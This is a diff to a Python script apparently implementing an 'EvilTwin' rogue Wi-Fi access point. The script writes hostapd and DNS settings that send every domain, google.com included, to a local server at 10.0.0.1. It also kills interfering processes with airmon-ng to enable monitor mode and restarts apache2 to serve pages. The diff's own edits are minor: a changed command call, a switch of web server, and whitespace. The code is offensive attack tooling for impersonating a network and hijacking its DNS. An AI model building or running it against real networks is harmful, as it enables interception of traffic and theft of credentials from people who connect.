@@ -16,7 +16,8 @@ from evilconfig import *
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
-directorycmd = os.system('pwd > /dev/null 2>&1')
+directorycmd = os.popen('pwd > /dev/null 2>&1').read
+
 
 
 hostapdCONF ="\
@@ -41,6 +42,7 @@ address=/#/10.0.0.1\n\
 address=/www.google.com/10.0.0.1\n\
 "
 
+
 class EvilTwin:
 
     def __init__(self,inter):
@@ -51,9 +53,7 @@ class EvilTwin:
         
         print (">>> restart-apache2")
         os.system('service apache2 stop > /dev/null 2>&1')
-        os.system('cd html && python -m http.server --cgi 80 & > /dev/null 2>&1')
-        os.system('cd ..')
-        #os.system('service apache2 start > /dev/null 2>&1')
+        os.system('service apache2 start > /dev/null 2>&1')
 
         print (">>> Enabling Monitor Mode")
         os.system('airmon-ng check kill > /dev/null 2>&1')
@@ -102,8 +102,6 @@ class EvilTwin:
         os.system('chown -R www-data:www-data /var/www/html/ > /dev/null 2>&1')
         os.system('rm -r conf > /dev/null 2>&1')
 
-
-
 def configF():
     os.system('mkdir conf > /dev/null 2>&1')
     with open("conf/hostapd.conf",'w') as f:
@@ -121,7 +119,7 @@ def configB():
 
 
 if(__name__ == "__main__"):
-    
+
     configF()
     configB()
     x = EvilTwin(wInt)
